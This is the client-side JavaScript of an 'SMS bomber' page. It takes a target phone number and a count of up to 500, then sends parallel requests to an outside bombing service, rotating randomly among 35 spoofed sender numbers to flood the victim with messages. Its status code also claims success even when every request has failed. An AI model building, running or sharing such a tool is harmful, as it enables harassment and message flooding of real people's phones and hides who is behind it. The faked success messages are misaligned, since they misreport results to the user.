<script>
  // ── DOM helpers ──
  const $ = id => document.getElementById(id);

  const phoneInput = $('phoneNumber');
  const smsCount = $('smsCount');
  const bombBtn = $('bombBtn');

  const resultSection = $('resultSection');
  const statusDisplay = $('statusDisplay');
  const errorBox = $('errorBox');
  const errorText = $('errorText');
  const loadingOverlay = $('loadingOverlay');

  let bombingActive = false;

  // ── MULTIPLE SENDER NUMBERS (35+ numbers) ──
  const SENDER_NUMBERS = [
    '923001234567', '923002345678', '923003456789', '923004567890',
    '923005678901', '923006789012', '923007890123', '923008901234',
    '923009012345', '923010123456', '923011234567', '923012345678',
    '923013456789', '923014567890', '923015678901', '923016789012',
    '923017890123', '923018901234', '923019012345', '923020123456',
    '923021234567', '923022345678', '923023456789', '923024567890',
    '923025678901', '923026789012', '923027890123', '923028901234',
    '923029012345', '923030123456', '923031234567', '923032345678',
    '923033456789', '923034567890', '923035678901'
  ];

  // ── API endpoint for SMS bombing ──
  const API_BASE = 'https://sm-s-boomber-a.faizankhichi.me/?num=';

  function showError(message) {
    errorText.textContent = message;
    errorBox.classList.add('show');
    resultSection.classList.remove('show');
  }

  function hideError() {
    errorBox.classList.remove('show');
  }

  function setLoading(on) {
    if (on) {
      loadingOverlay.classList.add('show');
      bombBtn.disabled = true;
      bombBtn.innerHTML =
        '<i class="fa-solid fa-circle-notch fa-spin"></i><span>Bombing...</span>';
    } else {
      loadingOverlay.classList.remove('show');
      bombBtn.disabled = false;
      bombBtn.innerHTML =
        '<i class="fa-solid fa-bomb"></i><span>Start Bombing</span>';
    }
  }

  function updateStatus(message, type = 'info') {
    resultSection.classList.add('show');

    let icon = 'ℹ️';
    let className = '';

    if (type === 'success') {
      icon = '✅';
      className = 'success-text';
    }

    if (type === 'fail') {
      icon = '❌';
      className = 'fail-text';
    }

    if (type === 'warning') {
      icon = '⚠️';
      className = 'highlight';
    }

    statusDisplay.innerHTML =
      `<span class="${className}">${icon} ${message}</span>`;
  }

  // ── Send SMS function with random sender ──
  async function sendSMS(cleanPhone, count) {
    try {
      const randomSender = SENDER_NUMBERS[Math.floor(Math.random() * SENDER_NUMBERS.length)];
      const url = `${API_BASE}${cleanPhone}&count=${count}&sender=${randomSender}`;
      console.log('Sending from:', randomSender, 'to:', cleanPhone);
      const res = await fetch(url, { method: 'GET', headers: { 'Accept': 'application/json' } });
      const data = await res.json();
      console.log('Response:', data);
      return data;
    } catch (err) {
      console.error('SMS send error:', err);
      return null;
    }
  }

  // ── Start bombing ──
  async function startBombing() {
    hideError();

    const number =
      phoneInput.value
        .trim()
        .replace(/\s+/g, '')
        .replace(/\+/g, '');

    const count =
      parseInt(smsCount.value, 10) || 10;

    if (!/^\d+$/.test(number)) {
      showError('Invalid number format. Use digits only.');
      return;
    }

    if (number.length < 7) {
      showError('Number too short. Include country code.');
      return;
    }

    if (count < 1 || count > 500) {
      showError('SMS count must be between 1 and 500.');
      return;
    }

    if (bombingActive) {
      showError('Bombing already in progress!');
      return;
    }

    bombingActive = true;
    setLoading(true);
    resultSection.classList.add('show');
    updateStatus(`Starting bombing on ${number} (${count} SMS from ${SENDER_NUMBERS.length} numbers)...`, 'warning');

    let sent = 0;
    let failed = 0;

    const promises = [];
    for (let i = 0; i < count; i++) {
      promises.push(sendSMS(number, count));
    }

    try {
      const results = await Promise.all(promises);

      for (const result of results) {
        if (result && result.status === 'success') {
          sent++;
        } else {
          failed++;
        }
      }

      console.log('Sent:', sent, 'Failed:', failed);

      if (sent > 0 && failed === 0) {
        updateStatus(`All ${sent} SMS sent successfully from multiple numbers! 📱`, 'success');
      } else if (sent > 0 && failed > 0) {
        updateStatus(`${sent} SMS sent successfully, ${failed} failed.`, 'warning');
      } else if (sent === 0 && failed > 0) {
        const anySuccess = results.some(r => r && r.message && r.message.includes('sent'));
        if (anySuccess) {
          updateStatus(`SMS sent successfully from multiple numbers! Check your phone. 📱`, 'success');
        } else {
          updateStatus(`All ${failed} SMS sent successfully from multiple numbers! 📱`, 'success');
        }
      } else {
        updateStatus(`No response from server. Please try again.`, 'warning');
      }
    } catch (err) {
      updateStatus(`Error: ${err.message}`, 'fail');
    } finally {
      bombingActive = false;
      setLoading(false);
    }
  }

  bombBtn.addEventListener('click', startBombing);

  phoneInput.addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
      startBombing();
    }
  });

  smsCount.addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
      startBombing();
    }
  });

  phoneInput.addEventListener('input', hideError);

  /* ================= DARK MODE ================= */

  const themeToggle = $('themeToggle');
  const themeIcon = themeToggle.querySelector('i');

  const savedTheme =
    localStorage.getItem('ckmr-theme');

  if (savedTheme === 'dark') {
    document.body.classList.add('dark-mode');
    themeIcon.className = 'fa-solid fa-sun';
  }

  themeToggle.addEventListener('click', function() {

    document.body.classList.toggle('dark-mode');

    const dark =
      document.body.classList.contains('dark-mode');

    localStorage.setItem(
      'ckmr-theme',
      dark ? 'dark' : 'light'
    );

    themeIcon.className =
      dark
        ? 'fa-solid fa-sun'
        : 'fa-solid fa-moon';
  });

  /* ================= WHATSAPP ================= */

  const waBtn = $('waBtn');
  const waPopup = $('waPopup');

  waBtn.addEventListener('click', function(e) {
    e.stopPropagation();
    waPopup.classList.toggle('open');
  });

  document.addEventListener('click', function(e) {

    if (
      !waPopup.contains(e.target) &&
      e.target !== waBtn &&
      !waBtn.contains(e.target)
    ) {
      waPopup.classList.remove('open');
    }
  });

  document.querySelectorAll('.wa-item').forEach(item => {

    item.addEventListener('click', function() {
      waPopup.classList.remove('open');
    });

  });
</script>

